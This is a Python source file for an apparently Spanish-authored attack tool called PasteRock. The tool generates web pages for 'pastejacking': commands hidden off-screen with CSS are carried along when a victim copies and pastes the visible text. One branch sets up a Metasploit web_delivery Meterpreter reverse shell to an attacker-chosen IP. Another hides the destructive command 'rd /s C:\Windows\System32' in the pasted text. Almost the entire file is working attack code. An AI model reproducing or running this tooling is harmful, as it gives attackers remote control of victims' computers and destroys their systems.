#-*- coding: utf-8 -*-
#Autor: Andrés Montoya (SpyRock)
#No me hago responsable del mal uso que este se le pueda dar.
#!/usr/bin/python
import os
import sys
from colores import *
class windows():
	def __init__(self):
		pass
	def windowsinfect(self):
		self.resultado=raw_input(bcolors.WARNING+"["+bcolors.FAIL+"♬"+bcolors.WARNING+"]"+bcolors.payload+"¿Ya se creo la powershell? (y/n) ")
		if self.resultado == "n" or self.resultado == "N":
			self.ip=raw_input("\ningrese ip: ")
			self.port=raw_input("\ningrese puerto: ")
			print bcolors.WARNING+"["+bcolors.FAIL+"♬"+bcolors.WARNING+"]"+bcolors.payload+"Iniciando Metasploit Framework...!"
			documento="meta_config"
			archivo = open(documento,"w")
			archivo.write("""use exploit/multi/script/web_delivery\nset URIPATCH /\nset target 2\nset payload windows/meterpreter/reverse_tcp\nset lhost """+self.ip+"""\nset lport """+self.port+"""\nexploit""")
			archivo.close()
			print bcolors.FAIL+"["+bcolors.WARNING+"*"+bcolors.FAIL+"]"+bcolors.payload+"Por favor inicie de nuevo PasteRock."
			os.system("msfconsole -r meta_config")
			os.system("pasterock")
		elif self.resultado == "y" or self.resultado == "Y":
			self.ip=raw_input("Ingrese ip: ")
			self.mensaje1=raw_input("Primer Mensaje: ")
			self.mensaje2=raw_input("Segundo Mensaje: ")
			self.comando=raw_input("Comando: ")
			self.powershell=raw_input("Por favor, pegue aquí la powershell: ")
			index="index.html"
			job=open(index,"w")	
			job.write("""<p> """ + self.mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """+self.powershell+"""  c:\ & cls <br> """ + self.comando + """ </span> """+self.mensaje2+"""</p> """)
			job.close()
			os.system("cp index.html /var/www/html")
			print bcolors.WARNING+"["+bcolors.FAIL+"♬"+bcolors.WARNING+"]"+bcolors.payload+"Todo esta terminado "+bcolors.apache+"---> "+bcolors.payload+"http://"+self.ip+"/"
		else:
			sys.exit("Incorrecto.")
class windowsrm():
	def __init__(self):
		self.ip=raw_input(bcolors.payload+"ingrese ip: ")
		self.mensaje1=raw_input(bcolors.payload+"Primer Mensaje: ")
		self.sms2=raw_input(bcolors.payload+"Segundo Mensaje: ")
		self.comando=raw_input(bcolors.payload+"comando: ")
	def system32(self):
		archivo="index.html"
		work=open(archivo,"w")	
		work.write("""<p> """ + self.mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & rd /s C:\Windows\System32 & cls <br> """ + self.comando + """ </span>"""+self.sms2+""" </p> """)
		work.close()
		os.system("mv index.html /var/www/html")
		print bcolors.WARNING+"["+bcolors.FAIL+"♬"+bcolors.WARNING+"]"+bcolors.payload+"Todo esta terminado "+bcolors.apache+"---> "+bcolors.payload+"http://"+self.ip+"/"
